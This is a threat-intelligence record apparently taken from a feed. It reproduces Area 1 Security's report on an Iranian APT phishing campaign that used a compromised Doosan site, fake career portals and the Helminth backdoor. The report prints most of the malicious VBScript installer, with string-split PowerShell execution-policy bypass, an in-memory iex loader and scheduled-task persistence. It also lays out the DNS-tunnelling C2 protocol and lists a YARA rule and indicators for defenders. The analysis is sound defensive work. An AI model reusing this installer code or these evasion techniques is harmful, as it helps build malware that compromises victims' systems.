{
    "id": "38504c15-f61c-46ee-9ad1-b948696d6d62",
    "created_at": "2022-10-25T16:48:13.291021Z",
    "updated_at": "2025-03-27T02:17:27.620901Z",
    "deleted_at": null,
    "sha1_hash": "f2709b82b355ec9d5afedbba14e7f8e3f540c582",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-08-14T11:31:30Z",
    "file_modification_date": "2018-08-14T11:31:31Z",
    "file_size": 568879,
    "plain_text": "# OPERATION DOOS\n\n### IRN2 TARGETS SAUDI ARABIAN OIL AND GAS INDUSTRY WITH CAREER-THEMED PHISHING ATTACK\n\n\n-----\n\n## IRN2 Targets Saudi Arabian Oil and Gas Industry with Career- Themed Phishing Attack\n\n### TABLE OF CONTENTS\n\n\n### 03\n\n 04\n\n 05\n\n 08\n\n 09\n\n 10\n\n 11\n\n 12\n\n 14\n\n\n##### EXECUTIVE SUMMARY\n\n IRN2 INFECTION VECTOR\n\n HELMINTH INSTALLER\n\n FAKE DOOSAN PHISHING SITE\n\n HELMINTH.DNE POWERSHELL SCRIPT\n\n HELMINTH.DNS POWERSHELL SCRIPT\n\n ADDITIONAL PHISHING SITES & C2 INFRASTRUCTURE\n\n ADDITIONAL HELMINTH.DNE & HELMINTH.DNS SAMPLES\n\n INDICATORS OF COMPROMISE\n\n\n-----\n\n## IRN2 Targets Saudi Arabian Oil and Gas Industry with Career- Themed Phishing Attack\n\n### EXECUTIVE SUMMARY\n\n\nIranian cyber actors, in the Summer of 2017,\n\ncompromised a website of Doosan Power Systems\n\nIndia (DPSI) in order to conduct a targeted spear\nphishing campaign against Saudi Aramco affiliates.\n\nDPSI is a subsidiary of Doosan Heavy Industries &\n\nConstruction, the infrastructure support business of\n\nSouth Korean conglomerate Doosan Group. Doosan\n\nHeavy Industries & Construction, headquartered in\n\nChangwon, South Korea, is a power company with\n\nbusiness in the manufacturing and construction\n\nof nuclear power plants, thermal power stations,\n\nturbines, generators, and other power equipment.\n\nThe company is also responsible for engineering,\n\n\nprocurement, and construction at Saudi Aramco\naffiliated companies.\n\nThis Iranian cyber actor is identified by Area 1 Security\n\nas IRN2 and has been previously identified in the\n\ncybersecurity community as OilRig. IRN2 is known\n\nto target organizations throughout the middle east,\n\nincluding Israel, the United Arab Emirates, and\n\nSaudi Arabia. Artifacts of the compromise, which are\n\nreminiscent of previously reported OilRig campaigns,\n\nleveraged job-related social engineering lures\n\nthat would ultimately deliver a new variant of the\n\nHelminth backdoor.\n\n\n1 http://www.utilities-me.com/article-4668-doosan-to-build-power-plant-for-fadhili-project/\n\n\n-----\n\n#### IRN2 INFECTION VECTOR\n\nArea 1 Security discovered position.zip (SHA\n**256:c2731f4c6927025b2747ff3ab0d8bd3d9788d8**\n\n**dd1a08deb8d148c30877b203d2), an artifact of the**\n\nIRN2 infection vector, hosted at https://dpsiesr.\n\n**doosan[.]com/content/site/position.zip.**\n\nThe domain dpsiesr.doosan.com is a legitimate\n\nsite operated by a Doosan Heavy Industries &\n\nConstruction subsidiary known as Doosan Power\n\nSystems India (DPSI). The DPSI site is password\nprotected and intended for use by authorized\n\npersonnel for what appears to be eSourcing of end\nto-end power plant services. IRN2’s compromise of\n\nthis site to host malware is particularly interesting,\n\ngiven that Doosan is a key player in the Saudi Arabia\n\noil and gas industry, a well-known target of Iran. The\n\nactor likely leveraged Doosan in their targeting of the\n\noil and gas facility knowing it was a trusted name, and\n\ntherefore would reduce suspicion of malicious activity,\n\nincreasing their chances of success.\n\n\nThe file position.zip is an encrypted ZIP archive that\n\nwas used in a career-themed spear-phish attack against\n\nthe target, which falls closely in line with previously\n\nreported IRN2 attacks that used fake job offers as a\n\nsocial engineering lure. Area 1 Security frequently sees\n\nspear-phish attacks in which the target is sent an email\n\ncontaining a hyperlink to an externally hosted malicious\n\nfile. In this case, the file that the actor used was a ZIP\n\narchive encrypted with the password 123. Encryption\n\nof the ZIP file through password protection was likely\n\nemployed to circumvent security scanning.\n\nThe password may be communicated within the\n\nmessage body of the email, in a previous or\n\nsubsequent email, or even sometimes through out\nof-band means. With this particular attack, the actor\n\ncompromised the DPSI site, placed position.zip\n\non the site, then likely crafted an email with a link to\n\nthe ZIP archive and sent the email to the target.\n\n\nInside position.zip is a directory named Position, which contains two files. The first file,\n\n**Position.html.lnk, is a Windows shortcut file that will launch a VBScript via the wscript.exe**\n\nWindows service. The second file, site.html.url, is the VBScript that is launched by Position.html.lnk.\n\nBelow is the parsed metadata from the LNK file (note the timestamps were intentionally modified by\n\nthe actor to further obscure the attack, as evidenced in the coming sections):\n\n**out: Lnk File: Position.html.lnk**\n**Link Flags: HAS SHELLIDLIST | POINTS TO FILE/DIR | NO DESCRIPTION | HAS RELATIVE PATH STRING**\n**| NO WORKING DIRECTORY | HAS CMD LINE ARGS | HAS CUSTOM ICON**\n**File Attributes: ARCHIVE**\n**Create Time:  2016-07-16 07:42:37.983803**\n\n\n-----\n\n**Access Time:  2016-07-16 07:42:37.983803**\n**Modified Time: 2016-07-16 07:42:37.983803**\n**Target length: 164864**\n**Icon Index: 242**\n**ShowWnd: SW_SHOWMINNOACTIVE**\n**HotKey: 0**\n**Target is on local volume**\n**Volume Type: Fixed (Hard Disk)**\n**Volume Serial: 7a47aa60**\n**Vol Label:**\n**Base Path: C:\\Windows\\System32\\wscript.exe**\n**(App Path:) Remaining Path:**\n**Relative Path: ..\\..\\..\\..\\..\\Windows\\System32\\wscript.exe**\n**Command Line: /E:vbs ././././././././site.html.url**\n**Icon filename: C:\\Windows\\System32\\shell32.dll**\n\nThe VBScript site.html.url serves as an installer for a variant of the Helminth backdoor.\n\n#### HELMINTH INSTALLER\n\nThe contents of site.html.url (shown below) reveal the inclusion of doom3_Init, a subroutine\n\nidentified in malware used in multiple publicly reported IRN2 attacks.\n\n**Private Sub Workbook_Open()**\n\n**Set osList = GetObject(“winmgmts:”).InstancesOf(“Win32_OperatingSystem”)**\n**For Each os In osList**\n**If CInt(Split(os.Version, “.”)(0)) < 6 Then**\n**Exit Sub**\n**Else**\n**Exit For**\n**End If**\n**Next**\n**Call doom3_Init**\n**End SubFunction base64_decode(encodedstr)**\n**Const r64 = “ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/”**\n**Dim table(256), decodedstr**\n**For x = 1 To 256 Step 1**\n**table(x) = -1**\n\n\n-----\n\n**Next**\n**For x = 1 To 64 Step 1**\n**table(1 + Asc(Mid(r64, x, 1))) = x - 1**\n**Next**\n**Dim size**\n**size = Len(encodedstr)**\n**bits = 0**\n**decodedstr = “”**\n**For x = 1 To size Step 1**\n**c = table(1 + Asc(Mid(encodedstr, x, 1)))**\n**If (c <> -1) Then**\n**If (bits = 0) Then**\n**outword = c * 4**\n**bits = 6**\n**ElseIf (bits = 2) Then**\n**outword = c + outword**\n**decodedstr = decodedstr & (Chr(CLng(“&H” & Hex(outword Mod 256))))**\n**bits = 0**\n**ElseIf (bits = 4) Then**\n**outword = outword + Int(c / 4)**\n**decodedstr = decodedstr & (Chr(CLng(“&H” & Hex(outword Mod 256))))**\n**outword = c * 64**\n**bits = 2**\n**Else**\n**outword = outword + Int(c / 16)**\n**decodedstr = decodedstr & (Chr(CLng(“&H” & Hex(outword Mod 256))))**\n**outword = c * 16**\n**bits = 4**\n**End If**\n**End If**\n**Next**\n**base64_decode = decodedstr**\n**End Function**\n**Function Concat(fstr, sstr)**\n**Concat = fstr & sstr**\n**End Function**\n**Function Concot(fstr)**\n**Concot = fstr & Chr(34)**\n**End Function**\n**Sub doom3_Init()**\n**Set wss = CreateObject(“WScript.Shell”)**\n**pth = wss.ExpandEnvironmentStrings(“%PUBLIC%”) & “\\Libraries\\”**\n**Set fso = CreateObject(“Scripting.FileSystemObject”)**\n**If Not (fso.FolderExists(pth)) Then**\n**fso.CreateFolder (pth)**\n**End If**\n**If Not (fso.FileExists(pth & “test5.vbs”)) Then**\n**VBS = “CreateObject(“**\n\n\n-----\n\n**VBS = Concot(VBS)**\n**VBS = Concat(VBS, “WScript.Shell”)**\n**VBS = Concot(VBS)**\n**VBS = Concat(VBS, “).R”)**\n**VBS = Concat(VBS, “un “)**\n**VBS = Concot(VBS)**\n**VBS = Concat(VBS, “cmd /c type “)**\n**VBS = Concat(VBS, pth)**\n**VBS = Concat(VBS, “te”)**\n**VBS = Concat(VBS, “st5.txt”)**\n**VBS = Concat(VBS, “ | “)**\n**VBS = Concat(VBS, “powe”)**\n**VBS = Concat(VBS, “rshell -ex”)**\n**VBS = Concat(VBS, “ec byp”)**\n**VBS = Concat(VBS, “ass -no”)**\n**VBS = Concat(VBS, “profile - “)**\n**VBS = Concot(VBS)**\n**VBS = Concat(VBS, “,0”)**\n**Set spoFile = fso.CreateTextFile(pth & “test5.vbs”)**\n**spoFile.Write (VBS)**\n**spoFile.Close**\n**PS1 = “ [snipped for brevity] [Decoded BASE64 Blob]**\n\n**[$d=[System.Convert]::FromBase64String(“H4”+” [snipped for brevity]”);**\n**$m=New-Object System.IO.MemoryStream;**\n**$m.Write($d,0,$d.Length);**\n**$m.Seek(0,0)|Out-Null;**\n**iex((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($m,**\n**[System.IO.Compression.CompressionMode]::Decompress))).readtoend())**\n**] “**\n**Set spoFile = fso.CreateTextFile(pth & “tes” & “t5.txt”)**\n**PS1 = base64_decode(PS1)**\n**spoFile.Write (PS1)**\n**spoFile.Close**\n**Set fso = Nothing**\n**cmd1 = Concat(“sch”, “tasks /cre”)**\n**cmd1 = Concat(cmd1, (“ate /F /sc once /st “ & Chr(34)))**\n**cmd1 = Concat(cmd1, (FormatDateTime((Now + TimeValue(“0:0” & “2:0”)), 4)))**\n**cmd1 = Concat(cmd1, (Chr(34) & “ /tn “))**\n**cmd1 = Concat(cmd1, Chr(34))**\n**cmd1 = Concat(cmd1, (“Office_Update” & Chr(34) & “ /tr “ & pth & “test5.vbs”))**\n**cmd2 = “sch” & “tasks /run /tn “ & Chr(34) & “Office_Update” & Chr(34)**\n**wss.Run cmd1, 0**\n**Wscript.Sleep 5000**\n**wss.Run cmd2, 0**\n**Set wss = Nothing**\n**End If**\n**End Sub**\n**CreateObject(“WScript.Shell”).Run “https://www.doosan-hr.com/”,0**\n**call Workbook_Open**\n\n\n-----\n\nThe script installs the Helminth PowerShell payloads,\n\nwhich Area 1 Security has named Helminth.DnE and\n\nHelminth.DnS. Their overall functionality is very\n\nsimilar to publically reported variants of previous\n\nHelminth backdoors. The payloads are embedded\n\nin the installer as templates, and identifiers such\n\nas variable and function names are assigned at the\n\ntime of installation. These identifiers are randomly\n\ngenerated, so that no two payload scripts can be\n\nidentified by the same hash.\n\nHelminth.DnE and Helminth.DnS are installed in the\n\ndirectory %PUBLIC%\\Library\\RecordedTV<random>\\,\n\n#### FAKE DOOSAN PHISHING SITE\n\nIn addition to installing the Helminth PowerShell\n\nscripts, Area 1 Security observed an interesting\n\ntechnique employed by the VBScript site.html.url.\n\nThe script opens a web browser on the victim’s\n\nsystem and navigates to doosan-hr[.]com, a fake\n\nDoosan website. This technique has not been\n\nobserved in previous Helminth deliveries, which have\n\nbeen carried out through malicious Excel macros.\n\nAn image of the page (to the right) reveals a human\n\nresources site for resume submissions, which fits with\n\nthe career-themed social engineering tactics used\n\nthroughout the attack. The page had several notable\n\nmisspellings. In the “Contact Us” section, the state and\n\ncountry listed were “Ohaio, United State of Amrica.”\n\nAdditionally, the copyright notice in the footer of\n\nthe website read “All Resived Right 2016-2017\n\nDoosan Company.”\n\n\nwhere the <random> portion of the directory name\n\nis randomly generated and assigned at runtime. The\n\nHelminth.DnE and Helminth.DnS PowerShell scripts\n\nin the analyzed sample were written to this directory\n\nwith random file names and a .txt extension. Other\n\nvariants used the names DnE.Ps1 and DnS.Ps1,\n\nrespectively, for the payloads. A VBScript is also\n\nwritten to the same directory with either a randomly\n\nchosen file name or, as identified in previous samples,\n\n**backup1.vbs. This script is simply a loader for the**\n\nPowerShell payloads and is run via a scheduled task\n\nevery three minutes.\n\n\n-----\n\nThe creation of a fake website and continued\n\nuse of the Doosan brand demonstrates the extra\n\nsteps the actor was willing to take to minimize the\n\nvictim’s suspicions of malicious behavior. It is also\n\nvery possible the actor created the site to phish for\n\nadditional sensitive information, as the page lures\n\nvictims to create an account and upload their resume.\n\nThis could be of particular concern from a credential\n\nreuse standpoint. If the victim registers an account\n\non the fake site with the same credentials they use\n\n#### HELMINTH.DNE POWERSHELL SCRIPT\n\nHelminth.DnE is the first payload installed. The\n\nHelminth.DnE PowerShell script can upload and\n\ndownload files to and from a C2 server, as well as\n\nexecute code provided by the server. The script\n\ninstalls three directories in its workspace:\n\n-  C:\\Users\\Public\\Libraries\n\n**RecordedTV<random>\\up\\**\n\n-  C:\\Users\\Public\\Libraries\\\n\n**RecordedTV<random>\\dn\\**\n\n-  C:\\Users\\Public\\Libraries\\\n\n**RecordedTV<random>\\tp\\**\n\nIn the up\\ directory, files are placed for upload to\n\nthe server. Files downloaded from the server are\n\nplaced in the dn\\ directory. Before files are uploaded\n\nand downloaded, C:\\Users\\Public\\Libraries\\\n\n**RecordedTV<random>\\uplock and C:\\Users\\**\n\n**Public\\Libraries\\RecordedTV<random>\\dwnlock**\n\nare created, respectively. This is used as a mutex\n\nto ensure that only one file can be uploaded or\n\ndownloaded at a time.\n\n\nfor other accounts, the actor could potentially gain\n\nunauthorized access to those accounts. Not to\n\nmention, access to the victim’s resume would provide\n\nthe actor with a wealth of valuable information that\n\ncould be used for victim profiling or leveraged in the\n\ncreation of additional social engineering lures.\n\nWhile the victim browses the phishing site, the\n\nHelminth payloads are installed and begin\n\nexecuting in the background.\n\nHelminth.DnE communicates with its C2 server\n\n(in this sample, coldflys[.]com) over simple HTTP.\n\nAll downloads and uploads use a URL that looks\n\nlike http://coldflys[.]com/index.aspx?id=<ID>,\n\nwhere <ID> is a randomized identifier placed by the\n\ninstaller when filling the Helminth.DnE template.\n\nA character is appended to this URL depending\n\non the action being performed. The Helminth.DnE\n\nscript is programmed to perform the following\n\nactions, in order:\n\n|ACTION|CHARACTER APPENDED TO URL|\n|---|---|\n|Download flie to dn\\|2|\n|Download flie to dn\\ and execute|1|\n|Upload flies to up\\|3|\n\n\n-----\n\nNotable facts about the HTTP communication in the client requests include:\n\n\n\n- The HTTP Referrer is https://www.google.com\n\n- The User Agent in the first attempted request is\n\n**Microsoft BITS/7.7**\n\n- If the first HTTP request results in an exception,\n\nthe user agent is changed to Mozilla/5.0\n\n**(Windows NT 6.3; Win64; x64; Trident/7.0;**\n\n**rv:11.0) like Gecko**\n\n#### HELMINTH.DNS POWERSHELL SCRIPT\n\nHelminth.DnS is the second payload installed. The\n\nHelminth.DnS PowerShell script is also responsible for\n\ncommunicating with a C2 server but uses DNS queries\n\nrather than HTTP. The script can not only send data\n\nto the server, but also execute scripts received by\n\nthe server, all via DNS. It randomly generates\n\nsubdomains on the same domain as the C2 server\n\n(in this case shoterup[.]com) using a domain\n\ngeneration algorithm, and then performs DNS\n\nqueries on them. The communications protocol\n\nof this script is detailed below:\n\n1. First, the script sends a DNS query that acts as an\n\ninitial C2 beacon. The subdomain of this request\n\nfollows a specific pattern: zz000000<base36 of\n\n**a random number smaller than 46655>30**\n\n2. The script checks the response to this DNS\n\nquery and uses the first octet of the resolving\n\nIP address as an ID for the victim system\n\n\n\n- All uploaded and downloaded files are obfuscated\n\nby performing a bitwise XOR with the first character\n\nof the ID used in the HTTP request and encoding the\n\nresult with Base64\n\n3. The script then uses this ID in a DNS query to the\n\nC2 server, requesting additional instructions. The\n\nsubdomain of this request follows the pattern:\n\n**zza<ID>00000<base36 of a random number**\n\n**smaller than 46655>30**\n\n4. If no further instructions are provided,\n\nthe script exits and will be activated the\n\nnext time the loader script (backup1.vbs\n\nor <random>.vbs) is called\n\n5. If further instructions are required, the C2\n\nserver responds with the IP address 33.33.x.y,\n\nrepresenting a “command start” signal. Upon\n\nreceiving this IP address, the script converts the\n\nlast two octets from decimal integers to ASCII\n\ncharacters that are then used to name a batch\n\nfile stored in %PUBLIC%\\Libraries\\tp\\xy.bat\n\n\n-----\n\n6. Once the batch file is created, the script will\n\ncontinue to send DNS queries to the C2 server\n\nwhere the subdomain in the queries follows\n\nthe pattern: zz<ID>00000<base36 of random\n\nnumber smaller than 46655>232A<hex_\n\n**filename><i-counter>**\n\n7. The C2 server responds to these DNS queries\n\nwith IP addresses, each octet of which is\n\nconverted by the script from decimal integer\n\nto ASCII character and appended to the batch\n\nfile. The script will continue to send DNS queries\n\nand write characters to the batch file until the\n\nC2 server signals the end of the data stream by\n\nresponding with the IP address 35.35.35.35\n\n\n8. The script executes the now complete batch\n\nfile xy.bat and stores its output in %PUBLIC%\\\n\n**Libraries\\tp\\xy.txt**\n\n9. The file xy.txt is then exfiltrated by the script to\n\nthe C2 server. The script exfiltrates the data in\n\nthe text file by dividing it into 24-byte chunks\n\nand sending it as part of the subdomain in a\n\nseries of DNS queries. The subdomain follows\n\nthe pattern: zz<ID><name of batch file\n\n**without extension><base36 of sequence**\n\n**number><base36 of a random number smaller**\n\n**than 46655><up to 24 bytes of data from**\n\n**batch file output>**\n\n\n#### ADDITIONAL PHISHING SITES & C2 INFRASTRUCTURE\n\n\nAs noted above, the VBScript site.html.url opens a\n\nweb browser on the victim’s system and navigates to\n\n**doosan-hr[.]com, a fake Doosan human resources**\n\nsite for resume submissions. The domain was\n\nregistered on August 13, 2017, and shortly thereafter,\n\non August 15, 2017, the site was operational. The\n\nactors created doosan-hr.com not only as a social\n\nengineering tatic to ally suspicion but also as a\n\npossible means to obtain additional sensitive victim\n\ninformation.\n\nBased on analysis of doosan-hr[.]com, Area 1\n\nSecurity identified two additional sites with career\nthemed domains that were likely used in similar\n\nIRN2 phishing attacks. More specifically, registration\n\ninformation for doosan-hr[.]com revealed the\n\n\nregistrant telephone number +1.15152978248. The\n\ndomain mic-careers[.]com was registered with the\n\nsame number on August 5, 2017, just several days\n\nbefore the creation of doosan-hr[.]com. An image\n\nof mic-careers[.]com (shown below) reveals yet\n\nanother fake career-themed site and use of the exact\n\nsame language for the “About Us” section as seen on\n\n**doosan-hr[.]com. Again, the phishing site lures the**\n\ntarget to create an account and upload their resume.\n\nThe domain mic-careers[.]com was hosted on the\n\nIP address 173.254.236[.]148. This IP also hosted\n\nanother suspiciously-named domain, middleeast\n**jobs[.]net, which was registered on September 2,**\n\n2017. The site is no longer up, and an image of the\n\npage is not available. However, based on the name,\n\n\n-----\n\nIP resolution, and time of registration, this domain\n\nwas likely another IRN2 career-themed phishing site.\n\nIn addition to identifying the other phishing sites,\n\nArea 1 Security observed additional IRN2 command\n\nand control infrastructure. As noted earlier, the C2\n\ndomains for the analyzed samples of Helminth.DnE and\n\nHelminth.DnS were coldflys[.]com and shoterup[.]\n\n**com, respectively. Publically reported information links**\n\nboth domains to additional IRN2 operations, including\n\na campaign in November of 2017 that used a macro\nenabled XLS file, User list must change password.\n\n**xls, to deliver the same variant of the Helminth**\n\nbackdoor. In fact, use of macro-enabled XLS files to\n\ndeliver different variants of Helminth has been detailed\n\nin a number of publicly reported IRN2 campaigns.\n\nAnalyzing results of a YARA rule derived from the\n\nHelminth installer, site.html.url, Area 1 Security\n\nfound several macro-enabled XLS files that specifically\n\ndelivered Helminth.DnE and Helminth.DnS. From\n\nthese files, two additional C2 domains were identified:\n\n**barsupport[.]org and forskys[.]com.**\n\n#### ADDITIONAL HELMINTH.DNE & HELMINTH.DNS SAMPLES\n\nFive additional malicious files were found via the following YARA rule:\n\n**rule Helminth_Installer**\n**{**\n**strings:**\n**$s1 = “VBS = Concat(VBS,”**\n**$s2 = “Function base64_decode”**\n**$s3 = “Private Sub Workbook_Open()”**\n**$s4 = “cmd1 = Concat(“**\n**condition:**\n**$s2 and**\n**$s3 and**\n**(#s1 > 5 or #s4 > 3)**\n**}**\n\n\n-----\n\nAll samples were macro-enabled XLS files that delivered Helminth.DnE and Helminth.DnS. Details are noted below:\n\n**FILENAME: User list must change password.xls**\n\n-  SHA-256: B409538c99f99b94a5035d9fa44a506b41be0feb23e89b7e4d272ba791aa6002\n\n-  SHA-1: 0bd6e06470e384571058774d9b43841c8ffe54c2\n\n-  MD5: c10fc157d1c291c66284a9f07b52a376\n\n-  Modified Date: 2017-09-10 10:49:12\n\n-  C2: **coldflys[.]com**\n\n**FILENAME:** **list.xls**\n\n-  SHA-256: **0b88bdd5e6beec6c06ec8ad670ddff980acc4e35fa6a434268d6a0203a9dfc7a**\n\n-  SHA-1: **6a3923c6c35ed2ee302de57100b15f9a7aa20f9a**\n\n-  MD5: 1579208bc40a873e82603844990f6a5e\n\n-  Modified Date: 2017-07-18 12:15:15\n\n-  C2: shoterup[.]com\n\n**FILENAME:** **rewards.xls**\n\n-  SHA-256: cbbd0b863c8a31e577b9eabd4d2311a3a919370b0cc848cf297151321b3f6e66\n\n-  SHA-1: **88ee2c27e1dd4ed3400adf7e560d4c4ffeae17bb**\n\n-  MD5: 20c240bde16c6dc2f1638bcdf944975c\n\n-  Modified Date: 2017-05-16 03:50:39\n\n-  C2: forskys[.]com\n\n**FILENAME: survey sheet.xls**\n\n-  SHA-256: 214cd857955ed59f404f5b9fb76751eb4c2b45f4c2b9b821903d8f6c5269d810\n\n-  SHA-1: 80a1a1bcf4868d08a0e65475ced6b8fd337fdf86\n\n-  MD5: 3db49888dd5336befee765d43f23d9f8\n\n-  Modified Date: 2017-02-22 15:58:59\n\n-  C2: **barsupport[.]org**\n\n**FILENAME:** **Survey.xls**\n\n-  SHA-256: eb1f47c9f71d3fd2ff744a9454c256bf3248921fbcbadf0a80d5e73a0c6a82de\n\n-  SHA-1: 8f3953da84ec9d34ae6b97ff0f574758d39edad9\n\n-  MD5: e37bafef0d3315a015f48a2bf845d855\n\n-  Modified Date: 2017-02-20 16:48:43\n\n-  C2: barsupport[.]org\n\n-  Contained in Survey.zip\n**(1a30d55623ae68703793993c94e2af620f3655b206023ecdade099aed6a16452)**\n\n\n-----\n\n#### INDICATORS OF COMPROMISE\n\n**SHA-256 HASHES:**\n\nc2731f4c6927025b2747ff3ab0d8bd3d9788d8dd1a08deb8d148c30877b203d2\n0b88bdd5e6beec6c06ec8ad670ddff980acc4e35fa6a434268d6a0203a9dfc7a\n214cd857955ed59f404f5b9fb76751eb4c2b45f4c2b9b821903d8f6c5269d810\neb1f47c9f71d3fd2ff744a9454c256bf3248921fbcbadf0a80d5e73a0c6a82de\n1a30d55623ae68703793993c94e2af620f3655b206023ecdade099aed6a16452”\n\nb409538c99f99b94a5035d9fa44a506b41be0feb23e89b7e4d272ba791aa6002\ncbbd0b863c8a31e577b9eabd4d2311a3a919370b0cc848cf297151321b3f6e66\n02171e646f919ef3a145323928f73f0b7104a873a4842c23abb8628d740eebec\n7595a6534866ab0fdc0d088a0841f04d689d6eba41761ad20976a40cfa4fbdd0\n\n**SHA-1 HASHES:**\n\nc7806e21fd9ea72d8de4b01f9dbd65a74f070b57\n0bd6e06470e384571058774d9b43841c8ffe54c2\n6a3923c6c35ed2ee302de57100b15f9a7aa20f9a\n88ee2c27e1dd4ed3400adf7e560d4c4ffeae17bb\n80a1a1bcf4868d08a0e65475ced6b8fd337fdf86\n8f3953da84ec9d34ae6b97ff0f574758d39edad9\nc71123d2f76874def40041a535839dd2db31d645\n\n**MD5 HASHES:**\n\n991241310d775edff106be83719c07ab\nc10fc157d1c291c66284a9f07b52a376\n1579208bc40a873e82603844990f6a5e\n20c240bde16c6dc2f1638bcdf944975c\n3db49888dd5336befee765d43f23d9f8\nE37bafef0d3315a015f48a2bf845d855\n848e6582976d56f0c4b32f89f750a74c\n\n**COMPROMISED DPSI SITE AND URL:**\n\ndpsiesr.doosan[.]com\n\nhttps://dpsiesr.doosan[.]com/content/site/position.zip\n\n**PHISHING SITES:**\n\ndoosan-hr[.]com\nmic-careers[.]com\nmiddleeast-jobs[.]net\n\n\n-----\n\n**HELMINTH HTTP C2:**\n\ncoldflys[.]com\nshoterup[.]com\nbarsupport[.]org\nForskys[.]com\nhttp://coldflys[.]com/index.aspx?id=<ID>\n\n**HELMINTH DNS C2:**\n\nzz000000<random>30.shoter[.]com\nzz<ID>00000<random>30.shoter[.]com\nzz<ID>00000<random>232A<hex_filename><i-counter>.shoter[.]com\n\nzz<ID><name of batch file><sequence number><random><24 bytes of batch file output>.shoter[.]com\n\n**HELMINTH.DNE USER AGENTS:**\n\nMicrosoft BITS/7.7\nMozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko\n\n**HELMINTH LOADER:**\n\n%PUBLIC%\\Libraries\\RecordedTV<random>\\<random>.vbs\n%PUBLIC%\\Libraries\\RecordedTV<random>\\backup1.vbs\n\n**HELMINTH INSTALLATION:**\n\n%PUBLIC%\\Libraries\\RecordedTV<random>\\<random>.txt\n%PUBLIC%\\Libraries\\RecordedTV<random>\\DnE.Ps1\n%PUBLIC%\\Libraries\\RecordedTV<random>\\DnS.Ps1\n\n**HELMINTH.DNE:**\n\n%PUBLIC%\\Libraries\\RecordedTV<random>\\up\\\n%PUBLIC%\\Libraries\\RecordedTV<random>\\dn\\\n%PUBLIC%\\Libraries\\RecordedTV<random>\\tp\\\n%PUBLIC%\\Libraries\\RecordedTV<random>\\uplock\n%PUBLIC%\\Libraries\\RecordedTV<random>\\dwnlock\n\n**HELMINTH.DNS:**\n\n%PUBLIC%\\Libraries\\tp\\xy.bat\n\n%PUBLIC%\\Libraries\\tp\\xy.txt\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://cdn.area1security.com/reports/Area-1-Security-OperationDoos-IRN2%20Targets%20Saudi%20Arabian%20Oil%20and%20Gas%20Industry%20With%20Career-Themed%20Phishing%20Attack.pdf?utm_source=external%20share&amp;utm_email=asset&amp;utm_campaign=report&amp;utm_content=operationdoos"
    ],
    "report_names": [
        "Area-1-Security-OperationDoos-IRN2%20Targets%20Saudi%20Arabian%20Oil%20and%20Gas%20Industry%20With%20Career-Themed%20Phishing%20Attack.pdf?utm_source=external%20share&amp;utm_email=asset&amp;utm_campaign=report&amp;utm_content=operationdoos"
    ],
    "threat_actors": [
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
